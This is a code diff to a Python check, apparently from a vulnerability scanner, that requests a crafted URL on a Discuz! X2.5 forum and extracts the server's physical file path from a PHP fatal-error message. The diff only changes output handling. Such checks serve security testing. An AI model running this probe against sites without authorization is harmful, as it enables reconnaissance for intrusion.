@@ -9,8 +9,8 @@ description: 报错导致路径泄露。
 import re
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class discuz_x25_path_disclosure_BaseVerify:
     def __init__(self, url):
@@ -29,12 +29,12 @@ class discuz_x25_path_disclosure_BaseVerify:
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 pattern = re.search('Fatal error.* in <b>([^<]+)</b> on line <b>(\d+)</b>', req.text)
                 if pattern:
-                    cprint("[+]存在Discuz! X2.5 物理路径泄露漏洞...(低危)\tpayload: "+vulnurl+"\tGet物理路径: "+pattern.group(1), "green")
+                    return "[+]存在Discuz! X2.5 物理路径泄露漏洞...(低危)\tpayload: "+vulnurl+"\tGet物理路径: "+pattern.group(1)
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = discuz_x25_path_disclosure_BaseVerify(sys.argv[1])
     testVuln.run()
